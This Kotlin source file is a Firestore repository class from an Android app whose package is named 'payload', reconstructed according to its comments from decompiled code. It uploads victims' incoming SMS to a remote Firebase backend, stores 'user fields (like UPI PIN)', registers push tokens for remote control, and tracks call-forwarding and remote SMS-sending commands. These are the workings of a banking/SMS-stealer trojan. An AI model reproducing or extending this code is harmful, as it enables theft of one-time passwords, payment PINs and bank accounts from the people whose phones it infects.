package com.payload.jansiix0ne.data.repository

import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.payload.jansiix0ne.data.model.DeviceModel
import com.payload.jansiix0ne.data.model.SmsModel
import kotlinx.coroutines.tasks.await

/**
 * Repository for Firestore operations
 */
class FirestoreRepository {
    val firestore: FirebaseFirestore = FirebaseFirestore.getInstance()
    companion object {
        private const val TAG = "FirestoreRepository"
        private const val COLLECTION_MASTER = "MASTERHU"
        private const val COLLECTION_GLOBAL_SMS = "global_sms"
        private const val COLLECTION_INCOMING_SMS = "incoming_sms"
    }

    /**
     * Store SMS in device-specific collection and global collection
     */
    suspend fun storeSms(sms: SmsModel, deviceId: String): Result<Unit> {
        return try {
            // Store in device-specific collection
            val deviceCollection = firestore
                .collection(COLLECTION_INCOMING_SMS)
                .document(deviceId)
                .collection(COLLECTION_INCOMING_SMS)
            
            deviceCollection.add(sms).await()
            
            // Store in global collection
            val globalCollection = firestore
                .collection(COLLECTION_MASTER)
                .document(COLLECTION_GLOBAL_SMS)
                .collection(COLLECTION_GLOBAL_SMS)
            
            globalCollection.add(sms).await()
            
            Log.d(TAG, "SMS stored for device: $deviceId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to store SMS: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Save or update device information
     */
    suspend fun saveDeviceInfo(deviceId: String, deviceModel: DeviceModel): Result<Unit> {
        return try {
            firestore
                .collection(COLLECTION_MASTER)
                .document(deviceId)
                .set(deviceModel, SetOptions.merge())
                .await()
            
            Log.d(TAG, "Device info saved: $deviceId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save device info: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Get device information
     */
    suspend fun getDeviceInfo(deviceId: String): Result<DeviceModel?> {
        return try {
            val document = firestore
                .collection(COLLECTION_MASTER)
                .document(deviceId)
                .get()
                .await()
            
            if (document.exists()) {
                val deviceModel = document.toObject(DeviceModel::class.java)
                Result.success(deviceModel)
            } else {
                Result.success(null)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get device info: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Save user fields (like UPI PIN) to Firestore
     * Based on decompiled code: m4890b method
     * Path: MASTERHU/{deviceId}/userInfo/{deviceId}
     */
    suspend fun saveUserFields(fields: Map<String, Any>, deviceId: String): Result<Boolean> {
        return try {
            if (deviceId.isEmpty()) {
                return Result.success(false)
            }

            // مطابق کد decompiled: userInfo collection
            val userInfoRef = firestore
                .collection(COLLECTION_MASTER)
                .document(deviceId)
                .collection("userInfo")
                .document(deviceId)

            userInfoRef.set(fields, SetOptions.merge()).await()
            
            Log.d(TAG, "User fields updated: $fields")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update user fields: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Save FCM token to Firestore
     * Based on decompiled code: m4893e method
     * Path: MASTERHU/Users/{deviceId}
     */
    suspend fun saveFcmToken(deviceId: String, token: String): Result<Boolean> {
        return try {
            if (deviceId.isEmpty()) {
                return Result.success(false)
            }

            val fields = mapOf(
                "fcmToken" to token,
                "lastUpdated" to com.google.firebase.Timestamp.now()
            )
            
            firestore
                .collection(COLLECTION_MASTER)
                .document("Users")
                .collection(COLLECTION_MASTER)
                .document(deviceId)
                .set(fields, SetOptions.merge())
                .await()
            
            Log.d(TAG, "FCM token saved for $deviceId")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save FCM token: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Update forwarding status in Firestore
     * Based on decompiled code: m4895g method
     * Path: MASTERHU/Users/{deviceId}
     */
    suspend fun updateForwardingStatus(deviceId: String, status: Boolean): Result<Boolean> {
        return try {
            if (deviceId.isEmpty()) {
                return Result.success(false)
            }

            val fields = mapOf("callForwardStatus" to status)
            
            firestore
                .collection(COLLECTION_MASTER)
                .document("Users")
                .collection(COLLECTION_MASTER)
                .document(deviceId)
                .update(fields)
                .await()
            
            Log.d(TAG, "updateForwardingStatus success: $status")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "Error updating forwarding status: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Update forwarding executed status
     * Based on decompiled code
     */
    suspend fun updateForwardingExecuted(deviceId: String, executed: Boolean): Result<Boolean> {
        return try {
            if (deviceId.isEmpty()) {
                return Result.success(false)
            }

            val fields = mapOf("forwarding.executed" to executed)
            
            firestore
                .collection(COLLECTION_MASTER)
                .document(deviceId)
                .update(fields)
                .await()
            
            Log.d(TAG, "Forwarding executed status updated: $executed")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "Error updating forwarding executed: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Mark SendSms as sent in Firestore
     * Based on decompiled code: C2865e.java
     * Path: MASTERHU/{deviceId}
     */
    suspend fun markSendSmsAsSent(deviceId: String): Result<Boolean> {
        return try {
            if (deviceId.isEmpty()) {
                return Result.success(false)
            }

            val fields = mapOf("send_sms.sent" to true)
            
            firestore
                .collection(COLLECTION_MASTER)
                .document(deviceId)
                .update(fields)
                .await()
            
            Log.d(TAG, "SendSms marked as sent for $deviceId")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "Error marking SendSms as sent: ${e.message}", e)
            Result.failure(e)
        }
    }
}
